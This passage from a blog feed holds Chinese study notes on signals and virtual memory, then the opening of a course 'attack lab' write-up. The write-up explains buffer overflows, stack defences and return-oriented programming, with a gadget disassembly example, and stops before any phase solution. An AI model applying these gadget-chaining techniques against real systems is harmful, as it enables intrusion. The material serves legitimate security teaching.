href="#854-信号处理问题"></a> 8.5.4 信号处理问题</h4><p>要捕获多个信号的一些问题：</p><ul><li><strong>待处理信号被阻塞</strong>。Unix信号处理程序通常会阻塞当前处理程序正在处理的类型的待处理信号。比如，假设一个进程捕获了一个 SIGINT信号，并且当前正在运行它的 SIGINT处理程序。如果另一个 SIGINT信号传递到这个进程，那么这个 SIGINT将变成待处理的，但是不会被接收，直到处理程序返回。</li><li><strong>待处理信号不会排队等待</strong>。任意类型至多只有一个待处理信号。因此，如果有两个类型为k的信号传送到一个目的进程，而由于目的进程当前正在执行信号k的处理程序，所以信号k是阻塞的，那么第二个信号就被简单地丢弃，它不会排队等待。关键思想是存在一个待处理的信号仅仅表明至少已经有一个信号到达了。</li><li><strong>系统调用可以被中断</strong>。像read、wait和 accept这样的系统调用潜在地会阻塞进程一段较长的时间，称为慢速系统调用。在某些系统中，当处理程序捕获到一个信号时，被中断的慢速系统调用在信号处理程序返回时不再继续，而是立即返回给用户一个错误条件，并将 errno设置为 EINTR。</li></ul><h4 id="855-可移植的信号处理"><a class="markdownIt-Anchor" href="#855-可移植的信号处理"></a> 8.5.5 可移植的信号处理</h4><p>为了处理不同系统之间信号处理语义的差异，可以定义一个包装函数，称为Signal。它的调用方式和signal函数的调用方式一样。</p><p>Signal包装函数设置了一个信号处理程序，其信号处理语义如下：</p><ul><li>只有这个处理程序当前正在处理的那种类型的信号被阻塞</li><li>和所有信号实现一样，信号不会排队等待。</li><li>只要可能，被中断的系统调用会自动重启。</li><li>一旦设置了信号处理程序，它就会一直保持，直到 Signal带着 handler参数为SIG_IGN或者 SIG_DFL被调用。（一些比较老的Unⅸ系统会在一个处理程序处理完一个信号之后，将信号行为恢复为它的默认行为。）</li></ul><h4 id="856-显示地阻塞和取消阻塞信号"><a class="markdownIt-Anchor" href="#856-显示地阻塞和取消阻塞信号"></a> 8.5.6 显示地阻塞和取消阻塞信号</h4><p><img src="/posts/e0eae192/image-20210616155200810.png" alt="image-20210616155200810"></p><h4 id="857-同步流以避免讨厌的并发错误"><a class="markdownIt-Anchor" href="#857-同步流以避免讨厌的并发错误"></a> 8.5.7 同步流以避免讨厌的并发错误</h4><p><img src="/posts/e0eae192/image-20210616155703781.png" alt="image-20210616155703781"></p><p><img src="/posts/e0eae192/image-20210616155808141.png" alt="image-20210616155808141"></p><p><img src="/posts/e0eae192/image-20210616155726929.png" alt="image-20210616155726929"></p><p><img src="/posts/e0eae192/image-20210616155823683.png" alt="image-20210616155823683"></p><p><img src="/posts/e0eae192/image-20210616155903713.png" alt="image-20210616155903713"></p><hr><h3 id="86-非本地跳转"><a class="markdownIt-Anchor" href="#86-非本地跳转"></a> 8.6 非本地跳转</h3><p><strong>非本地跳转：</strong></p><p>C语言提供了一种用户级异常控制流形式，称为<strong>非本地跳转</strong>( nonlocal jump),它将控制直接从一个函数转移到另一个当前正在执行的函数，而不需要经过正常的调用一返回序列。非本地跳转是通过 setjmp和longjmp函数来提供的。</p><p><img src="/posts/e0eae192/image-20210616160043032.png" alt="image-20210616160043032"></p><ul><li><p>非本地跳转的一个重要应用：允许从一个深层嵌套的函数调用中立即返回，通常是由检测到某个错误情况引起的。</p></li><li><p>非本地跳转的另一个重要应用：是使一个信号处理程序分支到一个特殊的代码位置，而不是返回到被信号到达中断了的指令的位置。</p></li></ul><h3 id="87-操作进程的工具"><a class="markdownIt-Anchor" href="#87-操作进程的工具"></a> 8.7 操作进程的工具</h3><p>Linux系统提供了大量的监控和操作进程的有用工具：</p><ul><li><strong>STRACE</strong>: 打印一个正在运行的程序和它的子进程调用的每个系统调用的轨迹。对于好奇的学生而言，这是一个令人着迷的工具。用- static编译你的程序，能得到一个更干净的、不带有大量与共享库相关的输出的轨迹。</li><li><strong>PS</strong>: 列出当前系统中的进程（包括僵死进程）。</li><li><strong>TOP</strong>: 打印出关于当前进程资源使用的信息</li><li><strong>PMAP</strong>: 显示进程的存储器映射。</li><li>/<strong>proc</strong>: 一个虚拟文件系统，以ASCII文本格式输出大量内核数据结构的内容，用户程序可以读取这些内容。比如，输入“cat/proc/loadavg”，观察在Linux系统上当前的平均负载。</li></ul><hr><h2 id="第九章-虚拟存储器"><a class="markdownIt-Anchor" href="#第九章-虚拟存储器"></a> 第九章 虚拟存储器</h2><h3 id="91-物理和虚拟寻址"><a class="markdownIt-Anchor" href="#91-物理和虚拟寻址"></a> 9.1 物理和虚拟寻址</h3><p><strong>物理寻址：</strong></p><p><img src="/posts/e0eae192/image-20210616173343847.png" alt="image-20210616173343847"></p><p><strong>虚拟寻址：</strong></p><p>使用虚拟寻址时，CPU通过生成一个虚拟地址( Virtual Address,VA)来访问主存，这个虚拟地址在被送到存储器之前先转换成适当的物理地址。将一个虚拟地址转换为物理地址的任务叫做地址翻译(address translation)。</p><p><img src="/posts/e0eae192/image-20210616173400967.png" alt="image-20210616173400967"></p><hr><h3 id="92-地址空间"><a class="markdownIt-Anchor" href="#92-地址空间"></a> 9.2 地址空间</h3><p>地址空间是一个非负整数的有序集合：</p><p>{0,1,2，···}</p><p>虚拟地址空间：{0,1,2，···，N-1}</p><p>物理地址空间：{0,1,2，···，M-1}</p><p>地址空间的概念是很重要的，因为它清楚地区分了数据对象（字节）和它们的属性（地址）。一旦认识到了这种区别，那么我们就可以将其推广，允许每个数据对象有多个独立的地址，其中每个地址都选自一个不同的地址空间。这就是虚拟存储器的基本思想。主存中的每个字节都有个选自虚拟地址空间的虚拟地址和一个选自物理地址空间的物理地址。</p><hr><h3 id="93-虚拟存储器作为缓存的工具"><a class="markdownIt-Anchor" href="#93-虚拟存储器作为缓存的工具"></a> 9.3 虚拟存储器作为缓存的工具</h3><p><strong>虚拟存储器</strong>(VM)被组织为一个由存放在磁盘上的N个连续的字节大小的单元组成的数组。每字节都有一个唯一的虚拟地址，这个唯一的虚拟地址是作为到数组的索引的。</p><p>VM系统将虚拟存储器分割为称为<strong>虚拟页</strong>( Virtual Page,VP)的大小固定的块。每个虚拟页的大小为P=2<sup>p</sup>字节。</p><p>类似地，物理存储器被分割为<strong>物理页</strong>( Physical Page,PP),大小也为P字节（物理页也称为页帧( page frame))。</p><p>一个n位的地址空间有2<sup>n-p</sup>页</p><p>在任意时刻，虚拟页面的集合都分为三个不相交的子集：</p><ul><li><strong>未分配的</strong>：VM系统还未分配（或者创建）的页。未分配的块没有任何数据和它们相关联，因此也就不占用任何磁盘空间。</li><li><strong>缓存的</strong>：当前缓存在物理存储器中的已分配页。</li><li><strong>未缓存的</strong>：没有缓存在物理存储器中的已分配页。</li></ul><p><img src="/posts/e0eae192/image-20210616175211113.png" alt="image-20210616175211113"></p><h4 id="931-dram缓存的组织结构"><a class="markdownIt-Anchor" href="#931-dram缓存的组织结构"></a> 9.3.1 DRAM缓存的组织结构</h4><p>SRAM缓存：位于CPU和主存之间的L1、L2和L3高速缓存</p><p>DRAM缓存：虚拟存储器系统的缓存，它在主存中缓存虚拟页</p><p><strong>DRAM缓存的组织结构：</strong></p><ul><li>SRAM比DRAM快大约10倍，DRAM要比磁盘快大约100000多倍</li><li>巨大的不命中处罚和访问第一字节的开销</li><li>由于大的不命中处罚，DRAM缓存是全相连的</li><li>使用写回而不是直写</li></ul><h4 id="932-页表"><a class="markdownIt-Anchor" href="#932-页表"></a> 9.3.2 页表</h4><p>页表存放在<strong>物理存储器</strong>中</p><p><strong>页表</strong>就是一个<strong>页表条目</strong>（PTE）的数组，负责将虚拟页映射到物理页。每次地址翻译软件将一个虚拟地址转换成物理地址时都会读取页表。操作系统负责维护页表的内容，以及在磁盘和DRAM之间来回传送页。</p><p>每个PTE由一个有效位和一个n位地址字段组成</p><ul><li><p>设置了有效位（已缓存）</p><p>表明该虚拟页被缓存在DRAM中，地址字段表示DRAM中相应的物理页的起始位置，这个物理页缓存了该虚拟页</p></li><li><p>未设置有效位（还未被缓存）</p><ul><li>一个空地址表示这个虚拟页还未被分配</li><li>否则这个地址指向该虚拟页在磁盘上的起始位置（已分配未缓存）</li></ul></li></ul><p><img src="/posts/e0eae192/image-20210616211103583.png" alt="image-20210616211103583"></p><h4 id="933-页命中"><a class="markdownIt-Anchor" href="#933-页命中"></a> 9.3.3 页命中</h4><p>地址翻译硬件将虚拟地址作为一个索引来定位PTE 2,并从存储器中读取它。因为设置了有效位，那么地址翻译硬件就知道VP 2是缓存在存储器中的了。所以它使用PTE中的物理存储器地址（该地址指向PP 1中缓存页的起始位置），构造出这个字的物理地址。</p><h4 id="934-缺页"><a class="markdownIt-Anchor" href="#934-缺页"></a> 9.3.4 缺页</h4><p>DRAM缓存不命中称为<strong>缺页</strong></p><p>发现缺页后触发一个缺页异常，调用内核中的缺页异常处理程序，在物理页中选择一个牺牲页，如果牺牲页被修改过了则将牺牲页保存回磁盘，无论是否修改，内核都会修改牺牲页的PTE，然后将目标虚拟页缓存到磁盘中对应的物理页，更新目标页的PTE，然后异常处理程序返回，它会重新启动导致缺页的指令。</p><p><strong>交换</strong>( swapping)或者<strong>页面调度</strong>( paging)：在磁盘和存储器之间传送页的活动。</p><p>页从磁盘换入（或者页面调入）DRAM和从DRAM换出（或者页面调出）磁盘。</p><p>**按需页面调度：**一直等待，直到最后时刻，也就是当有不命中发生时，才换入页面的一种策略</p><h4 id="935-分配页面"><a class="markdownIt-Anchor" href="#935-分配页面"></a> 9.3.5 分配页面</h4><p><img src="/posts/e0eae192/image-20210616212903869.png" alt="image-20210616212903869"></p><h4 id="936-又是局部性救了我们"><a class="markdownIt-Anchor" href="#936-又是局部性救了我们"></a> 9.3.6 又是局部性救了我们</h4><p>尽管在整个运行过程中程序引用的不同页面的总数可能超出物理存储器总的大小，但是局部性原则保证了在任意时刻，程序将往往在一个较小的活动页面( active page)集合上工作，这个集合叫做工作集( working set)或者常驻集( resident set)。在初始开销，也就是将工作集页面调度到存储器中之后，接下来对这个工作集的引用将导致命中，而不会产生额外的磁盘流量</p><p>如果工作集的大小超出了物理存储器的大小，那么程序将产生一种不幸的状态，叫做<strong>颠簸(</strong> thrashing),这时页面将不断地<br>换进换出。虽然虚拟存储器通常是有效的，但会很慢。</p><hr><h3 id="94-虚拟存储器作为存储器管理的工具"><a class="markdownIt-Anchor" href="#94-虚拟存储器作为存储器管理的工具"></a> 9.4 虚拟存储器作为存储器管理的工具</h3><p>VM简化了链接和加载、代码和数据共享，以及应用程序的存储器分配。</p><ul><li><strong>简化链接</strong>。独立的地址空间允许每个进程的存储器映像使用相同的基本格式，而不管代码和数据实际存放在物理存储器的何处。例如，像我们在图813中看到的，个给定的Linux系统上的每个进程都使用类似的存储器格式。文本节总是从虛拟地址0x08048000处开始(对于32位地址空间)，或者从0x400000处开始(对于64位地址空间)。数据和节紧跟在文本节后面。栈占据进程地址空间最高的部分，并向下生长。这样的一致性极大地简化了链接器的设计和实现，允许链接器生成全链接的可执行文件，这些可执行文件是独立于物理存储器中代码和数据的最终位置的。</li><li><strong>简化加载</strong>。虚拟存储器还使得容易向存储器中加载可执行文件和共享对象文件。回想一下第7章，在ELF可执行文件中.text和.data节是连续的。要把这些节加载到一个新创建的进程中， Linux加载器分配虚拟页的一个连续的片(chunk),从地址0x08048000处开始(对于32位地址空间)，或者从0x400000处开始(对于64位地址空间)，把这些虚拟页标记为无效的（即未被缓存的），将页表条目指向目标文件中适当的位置。有趣的是，加载器从不实际拷贝任何数据从磁盘到存储器。在每个页初次被引用时，要么是CPU取指令时引用的，要么是一条正在执行的指令引用一个存储器位置时引用的，虚拟存储器系统会按照需要自动地调入数据页。</li><li><strong>简化共享</strong>。独立地址空间为操作系统提供了一个管理用户进程和操作系统自身之间共享的致机制。一般而言，每个进程都有自己私有的代码、数据、堆以及栈区域，是不和其他进程共享的。在这种情况下，操作系统创建页表，将相应的虚拟页映射到不同的物理页面。</li><li><strong>简化存储器分配</strong>。虚拟存储器为向用户进程提供一个简单的分配额外存储器的机制。当个运行在用户进程中的程序要求额外的堆空间时(如调用ma11oc的结果)，操作系统分配一个适当数字(例如k)个连续的虚拟存储器页面，并且将它们映射到物理存储器中任意位置的k个任意的物理页面。由于页表工作的方式，操作系统没有必要分配k个连续的物理存储器页面。页面可以随机地分散在物理存储器中。</li></ul><hr><h3 id="95-虚拟存储器作为存储器保护的工具"><a class="markdownIt-Anchor" href="#95-虚拟存储器作为存储器保护的工具"></a> 9.5 虚拟存储器作为存储器保护的工具</h3><p><img src="/posts/e0eae192/image-20210616214509999.png" alt="image-20210616214509999"></p><p><img src="/posts/e0eae192/image-20210616214520599.png" alt="image-20210616214520599"></p><p><img src="/posts/e0eae192/image-20210616214457345.png" alt="image-20210616214457345"></p><hr><h3 id="96-地址翻译"><a class="markdownIt-Anchor" href="#96-地址翻译"></a> 9.6 地址翻译</h3><p><img src="/posts/e0eae192/image-20210617120441290.png" alt="image-20210617120441290">地址翻译是一个N元素的虚拟地址空间（VAS)中的元素和一个M元素的物理地址空间（PAS)中元素之间的映射，</p><p><img src="/posts/e0eae192/image-20210618142508589.png" alt="image-20210618142508589"></p><p><strong>MMU如何利用页表来实现这种映射:</strong></p><p>CPU中的一个控制寄存器，<strong>页表基址寄存器</strong>( Page Table Base Register,PTBR)指向当前页表。</p><p>n位的虚拟地址包含两个部分：一个p位的<strong>虚拟页面偏移</strong>( Virtual Page Offset,<strong>VPO</strong>)和一个(n-p)位的<strong>虚拟页号</strong>（ Virtual Page Number,<strong>VPN</strong>).</p><p>MMU利用VPN来选择适当的PTE。例如，VPN0选择PTE0,VPN1选择PTE1,以此类推。</p><p>将页表条目中<strong>物理页号</strong>( Physical Page Number,PPN)和虚拟地址中的<strong>VPO</strong>串联起来，就得到相应的物理地址。</p><p>注意，因为物理和虚拟页面都是P字节的，所以<strong>物理页面</strong><br><strong>偏移</strong>( Physical Page Offset,PPO)和VPO是相同的。</p><p><img src="/posts/e0eae192/image-20210618142837272.png" alt="image-20210618142837272"></p><p><strong>当页面命中时，CPU硬件执行的步骤:</strong></p><p><img src="/posts/e0eae192/image-20210618143403713.png" alt="image-20210618143403713"></p><ul><li>第一步：处理器生成一个虚拟地址，并把它传送给MMU</li><li>第二步：MMU生成PTE地址，并从高速缓存/主存请求得到它。</li><li>第三步：高速缓存/主存向MMU返回PTE.</li><li>第四步：MMU构造物理地址，并把它传送给高速缓存/主存。</li><li>第五步：高速缓存/主存返回所请求的数据字给处理器。</li></ul><p>页面命中完全是由硬件来处理的，与之不同的是，<strong>处理缺页</strong>要求硬件和操作系统内核协作完成:</p><p><img src="/posts/e0eae192/image-20210618143420468.png" alt="image-20210618143420468"></p><ul><li>第一步到第三步：和图9-13a中的第一步到第三步相同。</li><li>第四步：PTE中的有效位是零，所以MMU触发了一次异常，传递CPU中的控制到操作系统内核中的缺页异常处理程序。</li><li>第五步：缺页处理程序确定出物理存储器中的牺牲页，如果这个页面已经被修改了，则把它换出到磁盘。</li><li>第六步：缺页处理程序页面调入新的页面，并更新存储器中的PTE.</li><li>第七步：缺页处理程序返回到原来的进程，再次执行导致缺页的指令。CPU将引起缺页的虚拟地址重新发送给MMU。因为虚拟页面现在缓存在物理存储器中，所以就会命中，在MMU执行了图9-13b中的步骤之后，主存就会将所请求字返回给处理器。</li></ul><h4 id="961-结合高速缓存和虚拟存储器"><a class="markdownIt-Anchor" href="#961-结合高速缓存和虚拟存储器"></a> 9.6.1 结合高速缓存和虚拟存储器</h4><p>图9-14展示了<strong>一个物理寻址的高速缓存如何和虚拟存储器结合起来</strong>。主要的思路是地址翻译发生在高速缓存査找之前。注意，页表条目可以缓存，就像其他的数据字一样。</p><p><img src="/posts/e0eae192/image-20210618144221444.png" alt="image-20210618144221444"></p><h4 id="962-利用tlb加速地址翻译"><a class="markdownIt-Anchor" href="#962-利用tlb加速地址翻译"></a> 9.6.2 利用TLB加速地址翻译</h4><p>**翻译后备缓冲器（TLB）：**许多系统为了消除存储器读数据的开销，它们在MMU中包括了一个关于PTE的小的缓存。</p><p>它用于组选择和行匹配的索引和标记字段是从虚拟地址中<br>的虚拟页号中提取出来的。如果TLB有T=2<sup>t</sup>个组，那么TLB索引(TLBI)是由VPN的t个最低位组成的，而TLB标记(TLBT)是由VPN中剩余的位组成的。</p><p><img src="/posts/e0eae192/image-20210618145747729.png" alt="image-20210618145747729"></p><p><img src="/posts/e0eae192/image-20210618145533203.png" alt="image-20210618145533203"></p><p><strong>TLB命中时的步骤：</strong></p><ul><li>第一步：CPU产生一个虚拟地址。</li><li>第二步和第三步：MMU从TLB中取出相应的PTE.</li><li>第四步：MMU将这个虚拟地址翻译成一个物理地址，并且将它发送到高速缓存/主存。</li><li>第五步：高速缓存/主存将所请求的数据字返回给CPU.</li></ul><p>当TLB不命中时，MMU必须从L1缓存中取出相应的PTE,如图9-16b所示。新取出的PTE存放在TLB中，可能会覆盖一个已经存在的条目。</p><h4 id="963-多级页表"><a class="markdownIt-Anchor" href="#963-多级页表"></a> 9.6.3 多级页表</h4><p><strong>一级页表</strong>中的每个PTE负责映射虚拟地址空间中一个4MB的片( chunk),这里每一片都是由1024个连续的页面组成的。比如，PTE0映射第一片，PTE1映射接下来的一片，以此类推。假设地址空间是4GB,1024个PTE已经足够覆盖整个空间了。</p><p><strong>二级页表</strong>中的每个PTE都负责映射一个4KB的虚拟存储器页面，就像我们査看只有一级的页表一样。注意，使用4字节的PTE,每个一级和二级页表都是4KB字节，这刚好和一个页面<br>的大小是一样的。</p><p><img src="/posts/e0eae192/image-20210618152422961.png" alt="image-20210618152422961"></p><p>这种方法从<strong>两个方面减少了存储器要求：</strong></p><ul><li>第一，如果一级页表中的一个PTE是空的，那么相应的二级页表就根本不会存在，这代表着一种巨大的潜在节约，因为对于一个典型的程序，4GB的虚拟地址空间的大部分都将是未分配的。</li><li>第二，只有一级页表才需要总是在主存中；虚拟存储器系统可以在需要时创建、页面调入或调出二级页表，这就减少了主存的压力；只有最经常使用的二级页表才需要缓存在主存中</li></ul><p><img src="/posts/e0eae192/image-20210618152610119.png" alt="image-20210618152610119"></p><h4 id="964-综合端到端的地址翻译"><a class="markdownIt-Anchor" href="#964-综合端到端的地址翻译"></a> 9.6.4 综合：端到端的地址翻译</h4><p><img src="/posts/e0eae192/image-20210619114131611.png" alt="image-20210619114131611"></p><p><img src="/posts/e0eae192/image-20210619114151547.png" alt="image-20210619114151547"></p><p><img src="/posts/e0eae192/image-20210619114205017.png" alt="image-20210619114205017"></p><p><img src="/posts/e0eae192/image-20210619114233781.png" alt="image-20210619114233781"></p><p><img src="/posts/e0eae192/image-20210619114250559.png" alt="image-20210619114250559"></p><hr><h3 id="97-案例研究-intel-core-i7-linux存储器系统"><a class="markdownIt-Anchor" href="#97-案例研究-intel-core-i7-linux存储器系统"></a> 9.7 案例研究： Intel Core i7/ Linux存储器系统</h3><hr><h3 id="98-存储器映射"><a class="markdownIt-Anchor" href="#98-存储器映射"></a> 9.8 存储器映射</h3><h4 id="981-再看共亨对象"><a class="markdownIt-Anchor" href="#981-再看共亨对象"></a> 9.8.1 再看共亨对象</h4><p>一个对象可以被映射到虚拟存储器的一个区域，要么作为<strong>共享对象</strong>，要么作为<strong>私有对象</strong>。</p><p>如果一个进程将一个<strong>共享对象</strong>映射到它的虚拟地址空间的一个区域内，那么这个进程对这个区域的任何写操作，对于那些也把这个共享对象映射到它们虚拟存储器的其他进程而言也是可见的。而且，这些变化也会反映在磁盘上的原始对象中。<br>另一方面，对一个映射到<strong>私有对象</strong>的区域做的改变，对于其他进程来说是不可见的，并且进程对这个区域所做的任何写操作都不会反映在磁盘上的对象中。一个映射到共享对象的虚拟存储器区域叫做共享区域。类似地，也有私有区域。</p><p><img src="/posts/e0eae192/image-20210621163041564.png" alt="image-20210621163041564"></p><p><strong>写时拷贝</strong></p><p>私有对象是使用一种叫做<strong>写时拷贝</strong>(copy-on- write)的巧妙技术被映射到虚拟存储器中的。<br>一个私有对象开始生命周期的方式基本上与共享对象的一样，在物理存储器中只保存有私有对象的一份拷贝。比如，图9-30a展示了一种情况，其中两个进程将一个私有对象映射到它们虚拟存储器的不同区城，但是共享这个对象同一个物理拷贝。对于每个映射私有对象的进程，相应私有区域的页表条目都被标记为<strong>只读</strong>，并且区域结构被标记为私有的写时拷贝。只要没有进程试图写它自己的私有区域，它们就可以继续共享物理存储器中对象的一个单独拷贝。然而，只要有一个进程试图写私有区城内的某个页面，那么这个写操作就会触发一个保护故障。<br>当故障处理程序注意到保护异常是由于进程试图写私有的写时拷贝区城中的一个页面而引起的，它就会在物理存储器中<strong>创建这个页面的一个新拷贝</strong>，<strong>更新页表条目</strong>指向这个新的拷贝，然后<strong>恢复</strong>这个页面的<strong>可写权限</strong>，如图9-30b所示。当故障处理程序返回时，CPU重新执行这个写操作，现在在新创建的页面上这个写操作就可以正常执行了。<br>通过延迟私有对象中的拷贝直到最后可能的时刻，写时拷贝最充分地使用了稀有的物理存储器。</p><p><img src="/posts/e0eae192/image-20210621163448754.png" alt="image-20210621163448754"></p><h4 id="982-再看fork函数"><a class="markdownIt-Anchor" href="#982-再看fork函数"></a> 9.8.2 再看fork函数</h4><p>新创建的子进程几乎但不完全与父进程相同。<strong>子进程得到与父进程用户级虚拟地址空间相同</strong><br><strong>的（但是独立的）一份拷贝，包括文本、数据和bss段、堆以及用户栈。子进程还获得与父进程</strong><br><strong>任何打开文件描述符相同的拷贝，这就意味着当父进程调用fork时，子进程可以读写父进程中</strong><br><strong>打开的任何文件。父进程和新创建的子进程之间最大的区别在于它们有不同的PID。</strong></p><p>既然我们理解了虚拟存储器和存储器映射，那么我们可以清晰地知道fork函数是如何创建一个带有自己独立虚拟地址空间的新进程的。<br><strong>当fork函数被当前进程调用时，内核为新进程创建各种数据结构，并分配给它一个唯一的PID.为了给这个新进程创建虚拟存储器，它创建了当前进程的 mm_struct、区域结构和页表的原样拷贝。它将两个进程中的每个页面都标记为只读，并将两个进程中的每个区域结构都标记为私有的写时拷贝。</strong></p><p>当fork在新进程中返回时，新进程现在的虚拟存储器刚好和调用fork时存在的虚拟存储器相同。当这两个进程中的任一个后来进行写操作时，写时拷贝机制就会创建新页面，因此，也就为每个进程保持了私有地址空间的抽象概念。</p><h4 id="983-再看-execvel函数"><a class="markdownIt-Anchor" href="#983-再看-execvel函数"></a> 9.8.3 再看 execvel函数</h4><p>正如在第8章中学到的， execve函数在当前进程中加载并运行包含在可执行目标文件a.out中的程序，用a.out程序有效地替代了当前程序。加载并运行a.out需要以下几个步骤：</p><ul><li><strong>删除已存在的用户区域</strong>。删除当前进程虚拟地址的用户部分中的已存在的区域结构。</li><li><strong>映射私有区域</strong>。为新程序的文本、数据、bss和栈区域创建新的区域结构。所有这些新的区域都是私有的、写时拷贝的。文本和数据区域被映射为a.out文件中的文本和数据区。bbs区域是请求二进制零的，映射到匿名文件，其大小包含在a.out中。栈和堆区域也是请求二进制零的，初始长度为零。图9-31概括了私有区域的不同映射。</li><li><strong>映射共享区域</strong>。如果a.out程序与共享对象（或目标）链接，<a href="http://xn--Clibc-055h357bs0jhnv7vi.so">比如标准C库libc.so</a>,那么这些对象都是动态链接到这个程序的，然后再映射到用户虚拟地址空间中的共享区域内。</li><li><strong>设置程序计数器(PC)</strong>。 execve的最后一件事情就是设置当前进程上下文中的程序计数器，使之指向文本区域的入口点。</li></ul><p>下一次调度这个进程时，它将从这个入口点开始执行。Linux将根据需要换入代码和数据页面。</p><p><img src="/posts/e0eae192/image-20210621164152972.png" alt="image-20210621164152972"></p><h4 id="984-使用mmap函数的用户级存储器映射"><a class="markdownIt-Anchor" href="#984-使用mmap函数的用户级存储器映射"></a> 9.8.4 使用mmap函数的用户级存储器映射</h4><hr><h3 id="99-动态存储器分配"><a class="markdownIt-Anchor" href="#99-动态存储器分配"></a> 9.9 动态存储器分配</h3><hr><h3 id="910-垃圾收集"><a class="markdownIt-Anchor" href="#910-垃圾收集"></a> 9.10 垃圾收集</h3><hr><h3 id="911-c程序中常见的与存储器有关的"><a class="markdownIt-Anchor" href="#911-c程序中常见的与存储器有关的"></a> 9.11 C程序中常见的与存储器有关的</h3>]]></content>
    
    
    <categories>
      
      <category>Course Study</category>
      
      <category>计算机系统</category>
      
    </categories>
    
    
    <tags>
      
      <tag>计算机系统</tag>
      
      <tag>学习笔记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>计算机系统Lab4-attack lab</title>
    <link href="/posts/9b9a13df/"/>
    <url>/posts/9b9a13df/</url>
    
    <content type="html"><![CDATA[<h1 id="attack-lab"><a class="markdownIt-Anchor" href="#attack-lab"></a> Attack lab</h1><h2 id="实验概括"><a class="markdownIt-Anchor" href="#实验概括"></a> 实验概括</h2><p>要求你进行五次攻击。攻击方式是code injection代码注入和Reeturn-oriented programming(ROP)</p><p>文件列表：</p><table><thead><tr><th>文件</th><th>用途</th></tr></thead><tbody><tr><td>ctarget</td><td>用来做Code injection攻击的程序，phase1-3</td></tr><tr><td>rtarget</td><td>用来做ROP攻击的程序,phase 4-5</td></tr><tr><td>cookie.txt</td><td>作为攻击的标识符</td></tr><tr><td>hex2raw</td><td>用来生成工具字符串</td></tr><tr><td>farm.c</td><td>用于生成面向返回的编程攻击</td></tr></tbody></table><h2 id="预备知识缓冲区溢出"><a class="markdownIt-Anchor" href="#预备知识缓冲区溢出"></a> 预备知识——缓冲区溢出</h2><p>缓冲区溢出的基本原理并不复杂。缓冲区就是操作系统为函数执行专门划分出的一段内存，包括栈(自动变量)、堆(动态内存)和静态数据区(全局或静态)。其中缓冲区溢出发生在栈里，栈存放了函数的参数、返回地址、EBP（EBP是当前函数的存取指针，即存储或者读取数时的指针基地址，可以看成一个标准的函数起始代码）和局部变量。</p><p><strong>当函数中对局部变量的赋值超过了为其分配的存储空间，超出的部分就会覆盖栈里其他部分的数据，也就是发生了缓冲区溢出</strong>。</p><p><img src="/posts/9b9a13df/14ce36d3d539b6000b87d3d293d6f22cc75cb793-1625283594106.jpeg" alt="img"></p><p><img src="/posts/9b9a13df/9213b07eca806538756b3e9fee5b6642af3482c2.jpeg" alt="img"></p><h2 id="预备知识rop攻击"><a class="markdownIt-Anchor" href="#预备知识rop攻击"></a> 预备知识——ROP攻击</h2><h3 id="rop攻击"><a class="markdownIt-Anchor" href="#rop攻击"></a> ROP攻击</h3><p>缓冲区溢出攻击的普遍发生给计算机系统造成了许多麻烦。现代的编译器和操作系统实现了许多机制，以避免遭受这样的攻击，限制入侵者通过缓冲区溢出攻击获得系统控制的方式。</p><p>（1）<strong>栈随机化</strong></p><p><code>栈随机化</code>的思想使得栈的位置在程序每次运行时都有变化。因此，即使许多机器都运行同样的代码，它们的栈地址都是不同的。上述3个阶段中，栈的地址是固定的，所以我们可以获取到栈的地址，并跳转到栈的指定位置。</p><p>（2）<strong>栈破坏检测</strong></p><p>最近的GCC版本在产生的代码加入了一种<code>栈保护者</code>机制，来检测缓冲区越界。其思想是在栈帧中任何局部缓冲区和栈状态之间存储一个特殊的金丝雀值。在恢复寄存器状态和从函数返回之前，程序检查这个金丝雀值是否被该函数的某个操作或者该函数调用的某个操作改变了。如果是的，那么程序异常中止。</p><p>（3）<strong>限制可执行代码区域</strong></p><p>最后一招是消除攻击者向系统中插入可执行代码的能力。一种方法是限制哪些内存区域能够存放可执行代码。</p><p>在ROP攻击中，因为栈上限制了不可插入可执行代码，所以不能像上述第二、第三阶段中插入代码。所以我们需要在已经存在的程序中找到特定的指令序列，并且这些指令是以<code>ret</code>结尾，这一段指令序列，我们称之为<code>gadget</code>。</p><p>每一段<code>gadget</code>包含一系列指令字节，而且以<code>ret</code>结尾，跳转到下一个<code>gadget</code>，就这样连续的执行一系列的指令代码，对程序造成攻击。</p><p><strong>示例</strong></p><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">setval_210</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> *p)</span></span><br><span class="hljs-function"></span>&#123;<br>  *p = <span class="hljs-number">3347663060U</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>对于上述代码，进行反汇编我们可以得到如下的执行序列，从中我们一个得到一个有趣指令序列:</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">0000000000400f15 &lt;setval_210&gt;:<br>  400f15: c7 07 d4 48 89 c7 movl <span class="hljs-variable">$0xc78948d4</span>,(%rdi)<br>  400f1b: c3 retq<br></code></pre></div></td></tr></table></figure><p>其中，字节序列<code>48 89 c7</code>是对指令<code>movq %rax, %rdi</code>的编码，就这样我们可以利用已经存在的程序，从中提取出特定的指令,执行特定的功能，地址为<code>0x400f18</code>，其功能是将<code>%rax</code>的内容移到<code>%rdi</code>。</p><p>指令的编码如下所示：</p><p><img src="/posts/9b9a13df/1433829-d6312f1ce53cf044.png" alt="img"></p><p>movq指令编码</p><p><img src="/posts/9b9a13df/1433829-2a663eb32fae331a.png" alt="img"></p><p>popq指令编码</p><p><img src="/posts/9b9a13df/1433829-c713c395456655fa.png" alt="img"></p><p>movl指令编码</p><p><img src="https://gitee.com/zino00/img_bed/raw/master/img/1433829-67690582e19e902b.png" alt="img"></p><h2 id="实验开始"><a class="markdownIt-Anchor" href="#实验开始"></a> 实验开始</h2><h3 id="1-phase1"><a class="markdownIt-Anchor" href="#1-phase1"></a> 1) 